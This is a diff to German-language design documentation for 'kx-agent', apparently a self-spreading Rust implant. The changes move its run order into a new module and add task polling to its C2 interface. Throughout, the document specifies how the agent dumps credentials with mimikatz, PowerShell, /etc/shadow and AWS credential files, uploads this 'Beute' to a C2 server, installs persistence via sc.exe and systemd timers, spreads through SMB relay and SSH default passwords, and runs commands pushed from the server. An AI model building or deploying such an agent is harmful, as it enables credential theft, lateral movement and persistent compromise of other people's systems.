@@ -4,24 +4,33 @@
 
 Quellmodulbaum des Binary-Crates `kx-agent`. `main.rs` ist der einzige
 Entry-Point und erzeugt das Executable `kx-agent`; `c2.rs`, `hostkey.rs`,
-`propagate.rs` und `tasks.rs` sind die Module (`mod c2;`, `mod hostkey;`,
-`mod propagate;`, `mod tasks;` in [main.rs:main]). Alle Module sind **private** —
+`lauf.rs`, `meldung.rs`, `propagate.rs` und `tasks.rs` sind die Module
+(`mod c2;`, `mod hostkey;`, `mod lauf;`, `mod meldung;`, `mod propagate;`,
+`mod tasks;` in [main.rs:main]). Alle Module sind **private** —
 `pub`-Symbole darin sind deshalb nur crate-intern erreichbar, das Crate stellt
 keine Bibliotheks-API bereit [main.rs:mod c2] [main.rs:mod hostkey]
-[main.rs:mod propagate] [main.rs:mod tasks].
+[main.rs:mod lauf] [main.rs:mod meldung] [main.rs:mod propagate]
+[main.rs:mod tasks].
 
 `hostkey.rs` kapselt die Host-Master-Keys gegen den oeffentlichen
 Server-Schluessel (Option `--server-key`): je Host ein eigener Master-Key, das
 Passwort wird damit verschluesselt und der Klartext verlaesst den Agenten
-nicht mehr [hostkey.rs:KeySealer] [hostkey.rs:versiegel].
+nicht mehr [hostkey.rs:KeySealer] [hostkey.rs:schluessel_fuer].
 
-`main.rs` orchestriert den Lauf in fester Reihenfolge: C2-Client aufbauen, sich
-selbst registrieren, lokale Secrets extrahieren und hochladen, Persistenz
-installieren, Hosts entdecken (ARP-Sweep oder vorgegebene `--hosts`-Liste), die
-Propagation ausführen und deren Ergebnisse an den C2-Server melden. `c2.rs`
-kapselt die HTTP-Kommunikation als dünnen Adapter über den Transport aus
-`kx_core::c2::transport` (dort: ureq + rustls via `kx_tls`), `propagate.rs` die
-Scan-und-Exploit-Logik (`kx_scanner`, `kx_exploit`).
+`lauf.rs` **besitzt die Reihenfolge des Laufs**: die eigene Beute melden, die
+Persistenz installieren, die Hosts entdecken (ARP-Sweep oder vorgegebene
+`--hosts`-Liste), die Propagation ausfuehren, die Funde melden, die Tasks
+abarbeiten. Vorher lag das in einer Funktion im Einstiegspunkt — der
+verbindungsstärkste Knoten im Code-Graph, ohne Test. Die Abhängigkeiten werden
+hineingereicht, nicht im Lauf erzeugt: der C2-Port, der Schlüsselvorrat, die
+Umgebung, die Argumente. Damit lässt sich ein Lauf ohne Server, ohne Netz und
+ohne Dateisystem prüfen [lauf.rs:Lauf] [lauf.rs:Lauf::start].
+
+`main.rs` ist der Einstiegspunkt: Argumente parsen, Abhängigkeiten bauen, den
+Lauf starten, den Exit-Code melden. `c2.rs` kapselt die HTTP-Kommunikation als
+dünnen Adapter über den Transport aus `kx_core::c2::transport` (dort: ureq +
+rustls via `kx_tls`), `propagate.rs` die Scan-und-Exploit-Logik (`kx_scanner`,
+`kx_exploit`).
 
 Der Wire-Vertrag liegt nicht in diesem Crate, sondern in `kx_core::c2` — Agent
 und C2-Server sprechen denselben Vertrag [c2.rs:C2Client]. Das Crate definiert
@@ -35,11 +44,11 @@ Verweigerung. `propagate.rs` **findet** und liefert Funde; `meldung.rs`
 
 Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 `#[cfg(target_os = "windows")]` bzw. `#[cfg(unix)]` getrennt
-[main.rs:collect_local_secrets] [main.rs:install_persistence].
+[lauf.rs:sammle_lokale_beute] [lauf.rs:System::install_persistenz].
 
 ## Interface
 
-### main.rs — CLI und Orchestrierung
+### main.rs — CLI und Einstiegspunkt
 
 - `[main.rs:Args]` — crate-private Konfigurationsstruktur via `clap::Parser`,
   `#[command(name = "kx-agent", about = "Kx-autonomer Agent")]`. Argumente:
@@ -52,15 +61,38 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
   (`--server-cert`,
   Pflicht). Es existieren **keine** Subcommands.
 - `[main.rs:main]` — `async fn main()` mit `#[tokio::main]`, einziger
-  Prozess-Einstiegspunkt.
-- `[main.rs:collect_local_secrets]` — `async fn collect_local_secrets() -> Vec<kx_core::secret::Secret>`;
+  Prozess-Einstiegspunkt. Parst die Argumente, baut die Abhängigkeiten
+  (Schlüsselvorrat, C2-Client, Umgebung), startet den Lauf und meldet den
+  Exit-Code. Die **Reihenfolge** des Laufs liegt in `lauf.rs`, nicht hier.
+- `[main.rs:Args::persistence_invocation]` — `fn persistence_invocation(&self, exe: PathBuf) -> Invocation`;
+  die Flag-Liste existiert genau hier, sonst nirgends.
+
+### lauf.rs — der Lauf
+
+- `[lauf.rs:Umgebung]` — `pub trait Umgebung` mit drei Aufrufen:
+  `lokale_beute()`, `funde_im_netz(entdeckt, relay_script)` und
+  `install_persistenz(invocation)`. Das ist der Seam, an dem der Lauf vom
+  System getrennt wird: im Betrieb die Extraktoren, die Angriffe und die
+  Persistenz, im Test eine Attrappe, die feste Stücke liefert. Zwei Adapter —
+  der Seam ist damit real [lauf.rs:Umgebung] [lauf.rs:System].
+- `[lauf.rs:System]` — `pub struct System`; die Anbindung an `kx_win`,
+  `kx_posix`, `kx_scanner` und `kx_exploit` [lauf.rs:System].
+- `[lauf.rs:Lauf]` — `pub struct Lauf<'a, U: Umgebung>` mit den Feldern
+  `args`, `port`, `sealer` und `umgebung`. Die Abhängigkeiten werden
+  hineingereicht, nicht im Lauf erzeugt [lauf.rs:Lauf].
+- `[lauf.rs:Lauf::new]` — `pub fn new(args, port, sealer, umgebung) -> Self` [lauf.rs:Lauf::new].
+- `[lauf.rs:Lauf::start]` — `pub async fn start(&self) -> Ergebnis`; die
+  Reihenfolge des Laufs. Liefert das Ergebnis der Meldungen; ob der Lauf ein
+  Fehlschlag ist, entscheidet das Ergebnis selbst [lauf.rs:Lauf::start]
+  [meldung.rs:Ergebnis::fehlgeschlagen].
+- `[lauf.rs:sammle_lokale_beute]` — `async fn sammle_lokale_beute() -> Vec<Secret>`;
   plattformabhängige Extraktion via `kx_win::extract_lsass`,
   `kx_win::extract_credential_manager` (Windows) bzw.
   `kx_posix::extract_shadow_hashes`, `kx_posix::extract_aws_credentials` (unix).
   Das Versiegeln und das Melden liegen nicht hier, sondern in `meldung.rs`.
-- `[main.rs:install_persistence]` — `async fn install_persistence() -> Result<(), Box<dyn std::error::Error>>`;
-  `kx_win::install_service` + `kx_win::start_service` (Windows) bzw.
-  `kx_posix::install_systemd_service` (unix).
+- `[lauf.rs:resolve_relay_script]` — `pub(crate) fn resolve_relay_script(script, basis) -> PathBuf`;
+  sucht das Asset **neben dem Binary**, sonst bleibt der relative Pfad stehen.
+- `[lauf.rs:binary_verzeichnis]` — `fn binary_verzeichnis() -> Option<PathBuf>` (privat).
 
 ### c2.rs — C2-Client
 
@@ -68,22 +100,20 @@ Der Client ist ein dünner Adapter über den Transport aus
 `kx_core::c2::transport` — TLS-Aufbau, Bearer-Header, URL-Bildung und
 Status→Fehler stehen dort, nicht in diesem Crate.
 
-- `[c2.rs:C2Port]` — `pub trait C2Port` mit genau zwei Aufrufen:
-  `registriere_host(&self, req: &RegisterRequest)` und
-  `melde_beute(&self, upload: &SecretUpload)`. Das ist der Seam, an dem der
-  Meldeweg testbar wird: hinter ihm stehen die `C2Client` im Betrieb und ein
-  Aufzeichner im Test. Der Transport ist blockierend, die Methoden sind
-  deshalb ehrlich synchron.
+- `[c2.rs:C2Port]` — `pub trait C2Port` mit genau vier Aufrufen:
+  `registriere_host(&self, req: &RegisterRequest)`, `melde_beute(&self, upload: &SecretUpload)`,
+  `hole_tasks(&self)` und `melde_task_ergebnis(&self, report: &TaskResultRequest)`.
+  Das ist der Seam, an dem der Meldeweg und der Lauf testbar werden: hinter ihm
+  stehen die `C2Client` im Betrieb und ein Aufzeichner im Test. Der Transport
+  ist blockierend, die Methoden sind deshalb ehrlich synchron.
 - `[c2.rs:C2Client]` — `pub struct C2Client` mit privatem Feld
   `transport: Transport`.
 - `[c2.rs:C2Client::new]` — `pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, TransportError>`;
   liest das Server-Zertifikat über `Transport::from_cert_file`.
 - `[c2.rs:C2Client]` — implementiert `C2Port`; `registriere_host` POST
-  `{base_url}/api/register`, `melde_beute` POST `{base_url}/api/secrets`.
-- `[c2.rs:C2Client::fetch_tasks]` — `pub fn fetch_tasks(&self) -> Result<Vec<Task>, TransportError>`;
-  GET `{base_url}/api/tasks`.
-- `[c2.rs:C2Client::report_task_result]` — `pub fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), TransportError>`;
-  POST `{base_url}/api/tasks/result`.
+  `{base_url}/api/register`, `melde_beute` POST `{base_url}/api/secrets`,
+  `hole_tasks` GET `{base_url}/api/tasks`, `melde_task_ergebnis` POST
+  `{base_url}/api/tasks/result`.
 
 ### meldung.rs — die Meldung an den C2
 
@@ -109,7 +139,7 @@ erzeugt die Beute nicht — es meldet sie.
 
 ### tasks.rs — Task-Ausführung
 
-- `[tasks.rs:run_pending_tasks]` — `pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, TransportError>`;
+- `[tasks.rs:run_pending_tasks]` — `pub async fn run_pending_tasks(port: &dyn C2Port, host_id: &str) -> Result<usize, TransportError>`;
   holt die offenen Tasks, führt diejenigen mit eigener Host-Kennung und Status
   `pending` aus und meldet Status und Ausgabe zurück.
 - `[tasks.rs:execute_command]` — `fn execute_command(command: &str) -> CommandOutput` (privat);
@@ -160,7 +190,7 @@ erzeugt die Beute nicht — es meldet sie.
 - Jeder Master-Key entsteht je Host **einmal** für die ganze Laufzeit. Derselbe
   Schlüssel versiegelt die Beute des Hosts und geht als `sealed_master` bei
   seiner Registrierung mit [hostkey.rs:KeySealer::schluessel_fuer].
-- Jedes lokal extrahierte Secret trägt die Host-Kennung des Agenten — der Host, bei dem es erbeutet wurde, ist hier der Agent selbst [main.rs:collect_local_secrets].
+- Jedes lokal extrahierte Secret trägt die Host-Kennung des Agenten — der Host, bei dem es erbeutet wurde, ist hier der Agent selbst [lauf.rs:sammle_lokale_beute].
 - Die Beuteaufnahme existiert genau einmal: `Secret` → versiegeln → `SecretUpload` liegt im Melde-Modul. `propagate.rs` und `main.rs` bauen den Upload nicht mehr selbst [meldung.rs:melde].
 - Die Ziel-Host-Kennung reist im Upload mit und kann nicht mehr auseinanderlaufen: „Die Ziel-Host-Kennung steht im Upload selbst — sie kann nicht mehr auseinanderlaufen." [c2.rs:C2Port::melde_beute].
 - `SecretUpload.host_id` muss auf einen registrierten Host verweisen; der Server lehnt eine leere Kennung ab [kx-core/src/c2.rs:SecretUpload](../../kx-core/src/c2.rs).
@@ -174,7 +204,7 @@ erzeugt die Beute nicht — es meldet sie.
   (`Type=oneshot`, `Restart=no`) und setzt `WorkingDirectory` auf das
   Verzeichnis des Binaries — `Type=simple` mit `Restart=always` wäre eine
   Neustart-Schleife gewesen, weil `main()` linear endet
-  [main.rs:install_persistence] [kx-posix/src/persist.rs:systemd_unit_content](../../kx-posix/src/persist.rs).
+  [lauf.rs:Lauf::install_persistenz] [kx-posix/src/persist.rs:systemd_unit_content](../../kx-posix/src/persist.rs).
 - Der Takt kommt nicht aus der Unit, sondern aus dem Timer
   (`kx-agent.timer`, `OnBootSec=2min`, `OnUnitActiveSec=5min`,
   `Persistent=true`); die Service-Unit hängt an ihm
@@ -183,23 +213,23 @@ erzeugt die Beute nicht — es meldet sie.
   (`<binary-dir>/assets/smbrelayx.py`); gibt es das dort nicht, bleibt der
   relative Pfad stehen. Der persistierte Agent bekommt den aufgelösten
   Pfad fest in die Argumentliste eingetragen
-  [main.rs:resolve_relay_script] [main.rs:Args::persistence_invocation].
+  [lauf.rs:resolve_relay_script] [main.rs:Args::persistence_invocation].
 - Das Token steht **nicht** im Klartext in der Unit-Datei: sie ist für jeden
   lesbar, der die Datei lesen darf. Die Unit referenziert `${KX_C2_TOKEN}`, das
   systemd aus der Environment-Datei `/etc/kx/kx-agent.env` (0600) auflöst
-  [main.rs:install_persistence] [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
+  [lauf.rs:Lauf::install_persistenz] [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
 - Das Crate hat keine Task-Verarbeitung: kein Task-Endpunkt wird abgefragt und es existiert kein Task-Handler, obwohl `kx_core::c2` `PATH_TASKS` anbietet [main.rs:main].
-- Ungültige IP-Konfiguration führt zum Panic, nicht zu einem Fehlerpfad: `.expect("Ungültige eigene IP")`, `.expect("Ungültige Start-IP")`, `.expect("Ungültige End-IP")` [main.rs:main].
-- Fehler der Secret-Extraktion werden verschluckt: jeder Extractor wird mit `.unwrap_or_default()` konsumiert, ein Fehlschlag liefert also null Secrets statt einen Abbruch [main.rs:collect_local_secrets].
-- Im `--hosts`-Zweig wird an `,` getrennt, getrimmt und per `filter_map(...ok())` geparst; nicht parsebare Einträge werden stillschweigend verworfen. Die erzeugten `DiscoveredHost` tragen `mac: [0; 6]` [main.rs:main].
-- Die für den ARP-Sweep verwendete MAC-Adresse ist der Platzhalter `own_mac = [0x00; 6]` [main.rs:main].
+- Ungültige IP-Konfiguration führt zum Panic, nicht zu einem Fehlerpfad: `.expect("Ungültige eigene IP")`, `.expect("Ungültige Start-IP")`, `.expect("Ungültige End-IP")` [lauf.rs:Lauf::host_kennung] [lauf.rs:Lauf::entdecken].
+- Fehler der Secret-Extraktion werden verschluckt: jeder Extractor wird mit `.unwrap_or_default()` konsumiert, ein Fehlschlag liefert also null Secrets statt einen Abbruch [lauf.rs:sammle_lokale_beute].
+- Im `--hosts`-Zweig wird an `,` getrennt, getrimmt und per `filter_map(...ok())` geparst; nicht parsebare Einträge werden stillschweigend verworfen. Die erzeugten `DiscoveredHost` tragen `mac: [0; 6]` [lauf.rs:Lauf::entdecken].
+- Die MAC-Adresse für den ARP-Sweep kommt vom Interface (`kx_scanner::read_mac`), nicht aus einem Platzhalter — der Sweep antwortet sonst nicht [lauf.rs:Lauf::entdecken].
 - Der Logfilter stammt aus `tracing_subscriber::EnvFilter::try_from_default_env()` (liest `RUST_LOG`) und fällt bei Fehlschlag auf `"info"` zurück [main.rs:main].
 - `std::process::exit(1)` wird bei fehlgeschlagener C2-Client-Initialisierung und bei fehlgeschlagenem ARP-Sweep ausgelöst [main.rs:main].
 - `std::process::exit(1)` wird am Ende des Laufs ausgelöst, wenn der C2-Server nicht erreichbar war (kein Host kam an) **oder** wenn Beute verloren ging, die der Agent erfolgreich erbeutet hatte. Ein Host ohne jeden Fund ist kein Fehlschlag — der Lauf hat den C2 erreicht. Ein gescheiterter Exploit ist ebenfalls kein Fehlschlag: nichts gefunden ist ein Ergebnis [meldung.rs:Ergebnis::fehlgeschlagen] [main.rs:main].
 - Fehler beim Melden werden **nicht** verworfen: jeder fehlgeschlagene Upload und jede fehlgeschlagene Registrierung wird geloggt und gezählt. Der Zähler entscheidet über den Exit-Code [meldung.rs:melde].
-- Feste `cred_type`/`source`-Paare: Windows-LSASS nutzt `secret_type` mit Quelle `"lsass"`, Credential Manager nutzt `"credential_manager"` mit Quelle `"cmdkey"`; unix nutzt `"shadow"` mit Quelle `"/etc/shadow"` und `"aws"` mit Quelle `"~/.aws/credentials"` [main.rs:collect_local_secrets].
-- Erbeutete Credentials werden mit festen Werten erfasst: SMB-Relay als `cred_type` `"nt_hash"` mit Quelle `"smb_relay"`, SSH-Default-Credentials als `cred_type` `"password"` mit Quelle `"default_creds"` [main.rs:collect_local_secrets] [propagate.rs:run_propagation].
-- Der Servicename ist auf beiden Plattformen `"kx-agent"`; der Windows-Anzeigename ist `"Kx Agent"`, unix übergibt eine leere Beschreibung [main.rs:install_persistence].
+- Feste `cred_type`/`source`-Paare: Windows-LSASS nutzt `secret_type` mit Quelle `"lsass"`, Credential Manager nutzt `"credential_manager"` mit Quelle `"cmdkey"`; unix nutzt `"shadow"` mit Quelle `"/etc/shadow"` und `"aws"` mit Quelle `"~/.aws/credentials"` [lauf.rs:sammle_lokale_beute].
+- Erbeutete Credentials werden mit festen Werten erfasst: SMB-Relay als `cred_type` `"nt_hash"` mit Quelle `"smb_relay"`, SSH-Default-Credentials als `cred_type` `"password"` mit Quelle `"default_creds"` [lauf.rs:sammle_lokale_beute] [propagate.rs:run_propagation].
+- Der Servicename ist auf beiden Plattformen `"kx-agent"`; der Windows-Anzeigename ist `"Kx Agent"`, unix übergibt eine leere Beschreibung [lauf.rs:Lauf::install_persistenz].
 - Eine leere `discovered`-Liste beendet die Propagation sofort ohne Scan (`debug!`-Log, leere Ergebnisse). Der TCP-Scan läuft immer mit `kx_scanner::COMMON_PORTS` und Timeout `1000` [propagate.rs:run_propagation].
 - Das Port-zu-Dienst-Mapping ist fest; jeder nicht gelistete Port ergibt `"unknown"` [propagate.rs:service_for_port].
 - `base_url` ist `server.trim_end_matches('/')`; nachgestellte Slashes werden entfernt, bevor Pfade angehängt werden [kx-core/src/c2/transport.rs:Transport::new](../../kx-core/src/c2/transport.rs).
@@ -212,20 +242,20 @@ erzeugt die Beute nicht — es meldet sie.
 
 - `[main.rs:Args]` — Liest die Umgebungsvariablen `KX_C2_URL` und `KX_C2_TOKEN` (clap-Attribut `env` an `--server` und `--token`).
 - `[main.rs:main]` — Initialisiert einen globalen `tracing_subscriber::fmt`-Subscriber und schreibt damit Logausgabe; der Filter wird aus `RUST_LOG` gelesen.
-- `[main.rs:main]` — Führt einen ARP-Sweep des konfigurierten Bereichs aus: `kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac)`; erzeugt Netzwerkverkehr auf dem genannten Interface.
+- `[lauf.rs:Lauf::entdecken]` — Führt einen ARP-Sweep des konfigurierten Bereichs aus: `kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac)`; erzeugt Netzwerkverkehr auf dem genannten Interface.
 - `[propagate.rs:run_propagation]` — Führt den TCP-Connect-Scan über `kx_scanner::scan_tcp(&ips, kx_scanner::COMMON_PORTS, 1000)` auf allen entdeckten IPs aus; je Host und Port wird eine Task gespawnt, die einen `TcpStream::connect` mit Timeout versucht [kx-scanner/src/tcp_scan.rs:scan_tcp](../../kx-scanner/src/tcp_scan.rs).
-- `[main.rs:collect_local_secrets]` — Greift auf Credential-Material des lokalen Hosts zu: `kx_win::extract_lsass()` und `kx_win::extract_credential_manager()` (Windows), `kx_posix::extract_shadow_hashes()` und `kx_posix::extract_aws_credentials()` (unix).
+- `[lauf.rs:sammle_lokale_beute]` — Greift auf Credential-Material des lokalen Hosts zu: `kx_win::extract_lsass()` und `kx_win::extract_credential_manager()` (Windows), `kx_posix::extract_shadow_hashes()` und `kx_posix::extract_aws_credentials()` (unix).
 - `[meldung.rs:melde]` — Meldet jeden Fund beim C2-Server an: erst den Host (`POST /api/register`, `host_id` = `ip` = eigene IP für den eigenen Host, Status `"agent"`), dann seine Beute (`POST /api/secrets`). Schlägt die Registrierung fehl, wird die Beute nicht gemeldet [meldung.rs:melde].
 - `[hostkey.rs:KeySealer::schluessel_fuer]` — Kapselt je Host einmal für die ganze Laufzeit einen Master-Key gegen den öffentlichen Server-Schlüssel; der Key geht als `sealed_master` bei der Registrierung mit und versiegelt die Beute desselben Hosts [hostkey.rs:KeySealer::schluessel_fuer].
 - `[meldung.rs:melde]` — Lädt jedes Stück Beute per `client.melde_beute(upload)` an den C2-Server hoch; Fehler je Stück werden geloggt und gezählt, die Schleife läuft weiter.
 - `[meldung.rs:melde]` — Meldet alle propagierten Hosts und ihre Beute an den C2-Server; die Reihenfolge ist Host zuerst, Beute danach, die Rueckgabewerte werden nicht verworfen.
-- `[main.rs:install_persistence]` — Liest den Pfad der eigenen Executable über `std::env::current_exe()`.
-- `[main.rs:install_persistence]` — Installiert und startet unter Windows den Dienst via `kx_win::install_service("kx-agent", &exe, "Kx Agent")` und `kx_win::start_service("kx-agent")`; unter unix via `kx_posix::install_systemd_service(&SystemdService { … })`.
-- `[main.rs:install_persistence]` — Schreibt unter unix die Unit-Datei `/etc/systemd/system/kx-agent.service`, die Timer-Datei `/etc/systemd/system/kx-agent.timer` und die Environment-Datei `/etc/kx/kx-agent.env` (0600, Verzeichnis 0700); jede Datei nur, wenn sich ihr Inhalt ändert. Führt `systemctl daemon-reload` (nur nach einer Änderung), `systemctl enable kx-agent` und `systemctl enable --now kx-agent.timer` aus [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
-- `[main.rs:resolve_relay_script]` — Prüft, ob der Assetpfad neben dem Binary liegt (`<binary-dir>/assets/smbrelayx.py`), und gibt sonst den relativen Pfad zurück; der persistierte Agent bekommt den aufgelösten Pfad in seiner Argumentliste.
-- `[main.rs:install_persistence]` — Spawnt unter Windows `cmd.exe /C sc.exe create kx-agent binPath= "<exe>" start= auto DisplayName= "Kx Agent"` und danach `sc.exe start kx-agent` [kx-win/src/persist.rs:install_service](../../kx-win/src/persist.rs) [kx-win/src/persist.rs:start_service](../../kx-win/src/persist.rs).
-- `[main.rs:collect_local_secrets]` — Liest unter unix `/etc/shadow` [kx-posix/src/secrets.rs:extract_shadow_hashes](../../kx-posix/src/secrets.rs) und `$HOME/.aws/credentials` (mit `HOME` als Env-Variable, Fallback `/root`) [kx-posix/src/secrets.rs:extract_aws_credentials](../../kx-posix/src/secrets.rs).
-- `[main.rs:collect_local_secrets]` — Spawnt unter Windows `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ...` für den Credential Manager [kx-win/src/secrets.rs:extract_credential_manager](../../kx-win/src/secrets.rs) und `mimikatz.exe sekurlsa::logonpasswords` für LSASS [kx-win/src/secrets.rs:extract_lsass](../../kx-win/src/secrets.rs).
+- `[lauf.rs:Lauf::install_persistenz]` — Liest den Pfad der eigenen Executable über `std::env::current_exe()`.
+- `[lauf.rs:Lauf::install_persistenz]` — Installiert und startet unter Windows den Dienst via `kx_win::install_service("kx-agent", &exe, "Kx Agent")` und `kx_win::start_service("kx-agent")`; unter unix via `kx_posix::install_systemd_service(&SystemdService { … })`.
+- `[lauf.rs:Lauf::install_persistenz]` — Schreibt unter unix die Unit-Datei `/etc/systemd/system/kx-agent.service`, die Timer-Datei `/etc/systemd/system/kx-agent.timer` und die Environment-Datei `/etc/kx/kx-agent.env` (0600, Verzeichnis 0700); jede Datei nur, wenn sich ihr Inhalt ändert. Führt `systemctl daemon-reload` (nur nach einer Änderung), `systemctl enable kx-agent` und `systemctl enable --now kx-agent.timer` aus [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
+- `[lauf.rs:resolve_relay_script]` — Prüft, ob der Assetpfad neben dem Binary liegt (`<binary-dir>/assets/smbrelayx.py`), und gibt sonst den relativen Pfad zurück; der persistierte Agent bekommt den aufgelösten Pfad in seiner Argumentliste.
+- `[lauf.rs:Lauf::install_persistenz]` — Spawnt unter Windows `cmd.exe /C sc.exe create kx-agent binPath= "<exe>" start= auto DisplayName= "Kx Agent"` und danach `sc.exe start kx-agent` [kx-win/src/persist.rs:install_service](../../kx-win/src/persist.rs) [kx-win/src/persist.rs:start_service](../../kx-win/src/persist.rs).
+- `[lauf.rs:sammle_lokale_beute]` — Liest unter unix `/etc/shadow` [kx-posix/src/secrets.rs:extract_shadow_hashes](../../kx-posix/src/secrets.rs) und `$HOME/.aws/credentials` (mit `HOME` als Env-Variable, Fallback `/root`) [kx-posix/src/secrets.rs:extract_aws_credentials](../../kx-posix/src/secrets.rs).
+- `[lauf.rs:sammle_lokale_beute]` — Spawnt unter Windows `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ...` für den Credential Manager [kx-win/src/secrets.rs:extract_credential_manager](../../kx-win/src/secrets.rs) und `mimikatz.exe sekurlsa::logonpasswords` für LSASS [kx-win/src/secrets.rs:extract_lsass](../../kx-win/src/secrets.rs).
 - `[c2.rs:C2Client::new]` — Liest das Server-Zertifikat (PEM) per `std::fs::read` von der Platte; der `ureq::Agent` des Transportes vertraut genau diesem PEM über `kx_tls::client_config_trusting` [kx-core/src/c2/transport.rs:Transport::from_cert_file](../../kx-core/src/c2/transport.rs).
 - `[c2.rs:C2Port::registriere_host]` — Sendet einen HTTP-POST an `{base_url}/api/register` mit JSON-Body = serialisierter `RegisterRequest` und Header `Authorization: Bearer {token}`.
 - `[c2.rs:C2Port::melde_beute]` — Sendet einen HTTP-POST an `{base_url}/api/secrets` mit JSON-Body = serialisierter `SecretUpload` und Header `Authorization: Bearer {token}`.
